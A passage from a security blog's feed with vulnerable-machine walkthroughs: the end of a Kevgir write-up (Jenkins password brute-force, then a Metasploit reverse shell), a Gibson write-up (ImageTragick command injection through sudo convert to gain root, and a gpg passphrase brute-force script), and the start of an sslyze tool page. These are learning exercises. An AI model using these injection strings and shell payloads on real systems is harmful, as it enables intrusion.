/bin/sh: 0: can't access tty; job control turned off
$
</code></p>

<h2>Jenkins</h2>

<p><code>
PORT      STATE SERVICE     VERSION
9000/tcp  open  http        Jetty winstone-2.9
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(winstone-2.9)
|_http-title: Dashboard [Jenkins]
</code></p>

<p><img class="center" src="/images/pentest/kevgir/jenkins.jpg" title="&lsquo;jenkins&rsquo; &lsquo;jenkins dashboard&rsquo;" ></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<p>```
msf auxiliary(jenkins_enum) > info</p>

<pre><code>   Name: Jenkins-CI Enumeration
 Module: auxiliary/scanner/http/jenkins_enum
License: Metasploit Framework License (BSD)
   Rank: Normal
</code></pre>

<p>Provided by:
  Jeff McCutchan</p>

<p>Basic options:
  Name       Current Setting  Required  Description</p>

<hr />

<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
  RHOSTS                      yes       The target address range or CIDR identifier
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
  THREADS    1                yes       The number of concurrent threads
  VHOST                       no        HTTP server virtual host</p>

<p>Description:
  This module enumerates a remote Jenkins-CI installation in an
  unauthenticated manner, including host operating system and Jenkins
  installation details.
```</p>

<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<p>```
msf auxiliary(jenkins_enum) > exploit</p>

<p>[+] 192.168.217.128:9000  &ndash; Jenkins Version 1.647
[<em>] /script restricted (403)
[</em>] /view/All/newJob restricted (403)
[+] <a href="http://192.168.217.128:9000/">http://192.168.217.128:9000/</a> &ndash; /asynchPeople/ does not require authentication (200)
[*] /systemInfo restricted (403)
```</p>

<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="/images/pentest/kevgir/jenkins-admin.jpg" title="&lsquo;jenkins admin&rsquo; &lsquo;jenkins admin&rsquo;" ></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<p>```
Module options (auxiliary/scanner/http/jenkins_login):</p>

<p>   Name              Current Setting                                     Required  Description</p>

<hr />

<p>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
   PASSWORD                                                              no        A specific password to authenticate with
   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
   RPORT             9000                                                yes       The target port (TCP)
   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
   THREADS           1                                                   yes       The number of concurrent threads
   USERNAME          admin                                               no        A specific username to authenticate as
   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                               no        Try the username as the password for all users
   USER_FILE                                                             no        File containing usernames, one per line
   VERBOSE           true                                                yes       Whether to print output for all attempts
   VHOST                                                                 no        HTTP server virtual host
```</p>

<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<p><code>
[+] 192.168.217.128:9000 - Login Successful: admin:hello
</code></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<p>```
options</p>

<p>Module options (exploit/multi/http/jenkins_script_console):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   API_TOKEN                   no        The API token for the specified username
   PASSWORD   hello            no        The password for the specified username
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
   RHOST      192.168.217.128  yes       The target address
   RPORT      9000             yes       The target port (TCP)
   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path to the Jenkins-CI application
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   admin            no        The username to authenticate as
   VHOST                       no        HTTP server virtual host</p>

<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>

<p>   Name   Current Setting  Required  Description</p>

<hr />

<p>   LHOST  192.168.217.132  yes       The listen address
   LPORT  8080             yes       The listen port</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   1   Linux
```</p>

<p>And a new shell appears!</p>

<p>```
msf exploit(jenkins_script_console) > exploit</p>

<p>[<em>] Started reverse TCP handler on 192.168.217.132:8080
[</em>] Checking access to the script console
[<em>] Logging in&hellip;
[</em>] 192.168.217.128:9000 &ndash; Sending Linux stager&hellip;
[<em>] Sending stage (849108 bytes) to 192.168.217.128
[</em>] Meterpreter session 1 opened (192.168.217.132:8080 &ndash;> 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500</p>

<p>meterpreter >
[!] Deleting /tmp/wE472W payload file
```</p>

<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<p><code>
PORT      STATE SERVICE     VERSION
46201/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequest:
|     Unrecognized protocol:
|   DNSVersionBindReq:
|     Unrecognized protocol:
|     version
|_    bind
53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
</code></p>

<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<p>```</p>

<hr />

<p>/ This will be a memorable month &mdash; no  \
\ matter how hard you try to forget it. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
    <link href="http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough/"/>
    <updated>2017-10-28T16:10:23-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/10/28/gibson-0-dot-2-walkthrough</id>
    <content type="html"><![CDATA[<p>The Vulnhub machine I picked for today&rsquo;s target is called Gibson. For this challenge, there are also some hints:</p>

<ul>
<li>SSH can forward X11.</li>
<li>The challenge isn&rsquo;t over with root. The flag is not where you expect to find it.</li>
</ul>


<p>Let&rsquo;s see what Gibson has in store for us!</p>

<!-- more -->


<h2>Recon</h2>

<p><code>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 fb:f6:d1:57:64:fa:38:66:2d:66:40:12:a4:2f:75:b4 (DSA)
|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 273   2016-05-07 13:03  davinci.html
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
</code></p>

<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>

<p>```</p>

<!-- Damn it Margo! Stop setting your password to "god" -->


<!-- at least try and use a different one of the 4 most -->


<!-- common ones! (eugene) -->


<p>```</p>

<p>With this information in hand, I tried SSH'ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>

<h2>Privilege escalation</h2>

<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>

<ul>
<li>there is a network interface connected to a different subnet:</li>
</ul>


<p>```
virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb</p>

<pre><code>      inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:7 errors:0 dropped:0 overruns:0 frame:0
      TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0 
      RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)
</code></pre>

<p>```</p>

<ul>
<li>VNC is running on the localhost:</li>
</ul>


<p><code>
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
</code></p>

<ul>
<li>user marvo has some sudo privileges that need to be checked out:</li>
</ul>


<p>```
User margo may run the following commands on gibson:</p>

<pre><code>(ALL) NOPASSWD: /usr/bin/convert
</code></pre>

<p>```</p>

<ul>
<li>other users on the host are duke and eugene</li>
</ul>


<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>

<p>```
margo@gibson:~$ /usr/bin/convert
Version: ImageMagick 6.7.7-10 2014-03-06 Q16 <a href="http://www.imagemagick.org">http://www.imagemagick.org</a>
Copyright: Copyright &copy; 1999-2012 ImageMagick Studio LLC
Features: OpenMP</p>

<p>Usage: convert [options &hellip;] file [ [options &hellip;] file &hellip;] [options &hellip;] file
[&hellip;]
```</p>

<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>

<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
remote code execution during conversion of several file formats.</p>

<p>ImageMagick allows to process files with external libraries. This
feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>

<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>

<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>

<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>

<p>So, the injection would look like this:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>

<p>And if the command takes arguments:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>

<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>

<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>

<p><code>
margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png
</code></p>

<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>

<p>```</p>

<h1>User privilege specification</h1>

<p>root    ALL=(ALL:ALL) ALL</p>

<p>margo    ALL=(ALL:ALL) ALL
```</p>

<p>Also, some other interesting tidbits in the the sudoers file:</p>

<p>```</p>

<h1>Allow members of group sudo to execute any command</h1>

<h2>disabled after Margo&rsquo;s security incident</h2>

<h2>%sudo ALL=(ALL:ALL) ALL</h2>

<h1>Allow Margo to convert pictures from the FTP server</h1>

<p>margo ALL=(ALL) NOPASSWD: /usr/bin/convert</p>

<h1>Allow eugene to manage virtual machines and visudo</h1>

<p>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
eugene ALL=(ALL:ALL)  /usr/sbin/visudo
```</p>

<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>

<p><code>
convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ sudo su
[sudo] password for margo:
root@gibson:/home/margo#
</code></p>

<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>

<p>```
root@gibson:~# virsh list &mdash;all</p>

<h2> Id    Name                           State</h2>

<p> 2     ftpserv                        running
```</p>

<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>

<p><code>
ls /var/lib/libvirt/images/
ftpserv.img
</code></p>

<p>To transfer the VM using scp, I first needed to enable SSH'ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>

<p>```
PermitRootLogin yes
AllowUsers eugene margo root
Match user root</p>

<pre><code>PasswordAuthentication yes
</code></pre>

<p>```</p>

<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>

<p><code>
scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
Ubuntu 14.04.3 LTS
root@192.168.217.148's password:
ftpserv.img                                   100%  512MB  22.6MB/s   00:22    
</code></p>

<p>Let&rsquo;s see what we have here:</p>

<p><code>
file ftpserv.img
ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
</code></p>

<p>To mount it, we need to learn the offset:</p>

<p>```
fdisk -l ftpserv.img
Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000</p>

<p>Device       Boot Start     End Sectors   Size Id Type
ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
```</p>

<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>

<p><code>
root@kali:/mnt# mkdir ftpserv
mount -o loop,offset=32256 ftpserv.img ftpserv
</code></p>

<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>

<p><code>
ls ftpserv
AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
BOOTSECT.BIN  DOS          GARBAGE       net
</code></p>

<p>The GARBAGE directory seems interesting:</p>

<p><code>
ls GARBAGE/
adminspo.jpg  flag.img  jz_ug.ans
</code></p>

<p>Let&rsquo;s see the picture first:</p>

<p><img class="center" src="/images/pentest/gibson/adminspo.jpg" title="&lsquo;sysadmin&rsquo; &lsquo;sysadmin life&rsquo;" ></p>

<p>I also ran exiftool on it and was rewarded with..something:</p>

<p><code>
exiftool adminspo.jpg
ExifTool Version Number         : 10.60
File Name                       : adminspo.jpg
Directory                       : .
File Size                       : 120 kB
File Modification Date/Time     : 2016:05:04 17:17:44-04:00
File Access Date/Time           : 2017:10:01 15:14:34-04:00
File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
File Permissions                : rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
Modify Date                     : 2016:05:04 22:29:32
Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
[...]
</code></p>

<p>Next I looked at the ANS file:</p>

<p><code>
file jz_ug.ans
jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences
</code></p>

<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>

<p>```
cat jz_ug.ans</p>

<p>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����</p>

<pre><code>�����������������������������������������������������۲���������������
�������������������������۲���������� ��������۲�����۲���������������
���������������������������������������������������� �����������������
޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
 ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
                              �                            �         �
                the ugliest of all are under 5 feet tall
</code></pre>

<p>```</p>

<p>Hmm, ok. Finally, another image file:</p>

<p><code>
file flag.img
flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
</code></p>

<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>

<p><code>
mount ftpserv/GARBAGE/flag.img flag
ls -la
total 70
drwxr-xr-x 4 root root  1024 May 14  2016 .
drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
drwx------ 2 root root 12288 May  5  2016 lost+found
drwxr-xr-x 2 root root  1024 May  5  2016 .trash
</code></p>

<p>Davinci is a snake game:</p>

<p>```</p>

<pre><code>        _________         _________             
       /         \       /         \            
      /  /~~~~~\  \     /  /~~~~~\  \           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |         / 
      |  |     |  |     |  |     |  |       //  
     (o  o)    \  \_____/  /     \  \_____/ /   
      \__/      \         /       \        /    
        |        ~~~~~~~~~         ~~~~~~~~         
        ^                               
        Welcome To The Snake Game!          
                Press Any Key To Continue...    
</code></pre>

<p>```</p>

<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>

<p><code>
cat hint.txt
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
</code></p>

<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>

<p>And finally, the hidden directory:</p>

<p><code>
ls -l
total 317
---x------ 1 root root    469 May 14  2016 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
</code></p>

<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>

<p><code>
cat tries.txt
zero cool
zerocool
zero kool
zerokool
</code></p>

<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>

<p><code>
john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
Created directory: /root/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL
</code></p>

<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>

<p><code>
wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt
</code></p>

<p>Now add the rules to John&rsquo;s config file:</p>

<p><code>
cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf
</code></p>

<p>Now I was able to generate the file with p@$$w0rd$:</p>

<p><code>
john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1
</code></p>

<p>And a quick shell script for bruteforcing from the file:</p>

<p>```
for pass in $(cat coolpass.txt) ; do</p>

<pre><code>echo "Trying:" $pass
gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
break
fi
</code></pre>

<p>done
```</p>

<p>The correct passphrase is <strong>Z3r0K00l</strong></p>

<p><code>
Trying: Z3r0K00l
gpg: CAST5 encrypted data
[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
gpg: encrypted with 1 passphrase
[GNUPG:] BEGIN_DECRYPTION
[GNUPG:] DECRYPTION_INFO 0 3
[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
[GNUPG:] PLAINTEXT_LENGTH 862
[GNUPG:] DECRYPTION_OKAY
gpg: WARNING: message was not integrity protected
[GNUPG:] END_DECRYPTION
Passphrase found! Z3r0K00l
</code></p>

<p>And the flag is:</p>

<p>```
cat flag.txt</p>

<hr />

<p>| | | | <strong> _  </strong><em>| | __ |</em>   <em>| |<strong>   </strong></em>   |  _ \| | <strong> _ _ </strong>   <strong><em>| |</em>| |
| |<em>| |/ </em><code>|/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _</code> | &lsquo;_ \ / _ \ </strong>| |
|  _  | (<em>| | (<strong>|   &lt;    | | | | | |  </strong>/  |  __/| | (</em>| | | | |  <strong>/ |<em>|</em>|
|<em>| |</em>|_<em>,</em>|_</strong>|<em>|_\   |</em>| |<em>| |</em>|_<strong>|  |<em>|   |</em>|_<em>,</em>|<em>| |</em>|_</strong>|_<em>(</em>)</p>

<p>Should you not be standing in a 360 degree rotating payphone when reading
this flag&hellip;? B-)</p>

<p>Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.</p>

<p>Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.</p>

<pre><code>                                                          --Knightmare
</code></pre>

<p>```</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://imagetragick.com/">ImageTragick</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: Why is Christmas just like a day at \
| the office? A: You do all of the work  |
| and the fat guy in the suit            |
|                                        |
\ gets all the credit.                   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sslyze - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools/"/>
    <updated>2017-07-16T04:57:44-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/16/sslyze-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: test the SSL/TLS security posture of a target as a standalone tool or as a custom made solution. sslyze is a fast and powerful SSL/TLS scanning Python tool that can be used both from the command line or as a library to include in your own scripts. It&rsquo;s being updated frequently and it&rsquo;s been tested on Windows, Linux and MacOS platforms.</p>

<p>Homepage: <a href="https://github.com/nabla-c0d3/sslyze">https://github.com/nabla-c0d3/sslyze</a></p>

<!-- more -->


<h2>sslyze description</h2>

<blockquote><p>SSLyze is a Python library and a CLI tool that can analyze the SSL configuration of a server by connecting to it. It
is designed to be fast and comprehensive, and should help organizations and testers identify mis-configurations
affecting their SSL/TLS servers.</p>

<p>Key features include:</p>

<ul>
<li><p>Python API, in order to run scans and process the results directly from Python.</p></li>
<li><p>Scans are automatically dispatched among multiple processes, making them very fast.</p></li>
<li><p>Performance testing: session resumption and TLS tickets support.</p></li>
<li><p>Security testing: weak cipher suites, insecure renegotiation, CRIME, Heartbleed and more.</p></li>
<li><p>Server certificate validation and revocation checking through OCSP stapling.</p></li>
<li><p>Support for StartTLS handshakes on SMTP, XMPP, LDAP, POP, IMAP, RDP, PostGres and FTP.</p></li>
<li><p>Support for client certificates when scanning servers that perform mutual authentication.</p></li>
<li><p>Scan results can be written to an XML or JSON file for further processing.</p></li>
<li><p>And much more!</p></li>
</ul>


<p>SSLyze is all Python code but it uses an OpenSSL wrapper written in C called nassl, which was specifically developed
for allowing SSLyze to access the low-level OpenSSL APIs needed to perform deep SSL testing.</p></blockquote>

<p>Documentation: <a href="https://nabla-c0d3.github.io/sslyze/documentation/">https://nabla-c0d3.github.io/sslyze/documentation/</a></p>

<h2>sslyze options</h2>

<p>```
Usage: sslyze.py [options] target1.com target2.com:443 etc&hellip;</p>

<p>Options:
  &mdash;version             show program&rsquo;s version number and exit
  -h, &mdash;help            show this help message and exit
  &mdash;xml_out=XML_FILE    Writes the scan results as an XML document to the file</p>

<pre><code>                    XML_FILE. If XML_FILE is set to "-", the XML output
                    will instead be printed to stdout.
</code></pre>

<p>  &mdash;targets_in=TARGETS_IN</p>

<pre><code>                    Reads the list of targets to scan from the file
                    TARGETS_IN. It should contain one host:port per line.
</code></pre>

<p>  &mdash;timeout=TIMEOUT     Sets the timeout value in seconds used for every</p>

<pre><code>                    socket connection made to the target server(s).
                    Default is 5s.
</code></pre>

<p>  &mdash;nb_retries=NB_RETRIES</p>

<pre><code>                    Sets the number retry attempts for all network
                    connections initiated throughout the scan. Increase
                    this value if you are getting a lot of
                    timeout/connection errors when scanning a specific
                    server. Decrease this value to increase the speed of
                    the scans; results may however return connection
                    errors. Default is 4 connection attempts.
</code></pre>

<p>  &mdash;https_tunnel=HTTPS_TUNNEL</p>

<pre><code>                    Tunnels all traffic to the target server(s) through an
                    HTTP CONNECT proxy. HTTP_TUNNEL should be the proxy's
                    URL: 'http://USER:PW@HOST:PORT/'. For proxies
                    requiring authentication, only Basic Authentication is
                    supported.
</code></pre>

<p>  &mdash;starttls=STARTTLS   Performs StartTLS handshakes when connecting to the</p>

<pre><code>                    target server(s). STARTTLS should be one of: ['smtp',
                    'xmpp', 'xmpp_server', 'pop3', 'ftp', 'imap', 'ldap',
                    'rdp', 'postgres', 'auto']. The 'auto' option will
                    cause SSLyze to deduce the protocol (ftp, imap, etc.)
                    from the supplied port number, for each target
                    servers.
</code></pre>

<p>  &mdash;xmpp_to=XMPP_TO     Optional setting for STARTTLS XMPP.  XMPP_TO should be</p>

<pre><code>                    the hostname to be put in the 'to' attribute of the
                    XMPP stream. Default is the server's hostname.
</code></pre>

<p>  &mdash;sni=SNI             Use Server Name Indication to specify the hostname to</p>

<pre><code>                    connect to. Will only affect TLS 1.0+ connections.
</code></pre>

<p>  &mdash;quiet               Hide script standard outputs. Will only affect script</p>

<pre><code>                    output if --xml_out is set.
</code></pre>

<p>  &mdash;regular             Regular HTTPS scan; shortcut for &mdash;sslv2 &mdash;sslv3</p>

<pre><code>                    --tlsv1 --tlsv1_1 --tlsv1_2 --reneg --resum
                    --certinfo=basic --http_get --hide_rejected_ciphers
                    --compression --heartbleed
</code></pre>

<p>  Client certificate support:</p>

<pre><code>--cert=CERT         Client certificate chain filename. The certificates
                    must be in PEM format and must be sorted starting with
                    the subject's client certificate, followed by
                    intermediate CA certificates if applicable.
--key=KEY           Client private key filename.
--keyform=KEYFORM   Client private key format. DER or PEM (default).
--pass=KEYPASS      Client private key passphrase.
</code></pre>

<p>  PluginOpenSSLCipherSuites:</p>

<pre><code>Scans the server(s) for supported OpenSSL cipher suites.

--sslv2             Lists the SSL 2.0 OpenSSL cipher suites supported by
                    the server(s).
--sslv3             Lists the SSL 3.0 OpenSSL cipher suites supported by
                    the server(s).
--tlsv1             Lists the TLS 1.0 OpenSSL cipher suites supported by
                    the server(s).
--tlsv1_1           Lists the TLS 1.1 OpenSSL cipher suites supported by
                    the server(s).
--tlsv1_2           Lists the TLS 1.2 OpenSSL cipher suites supported by
                    the server(s).
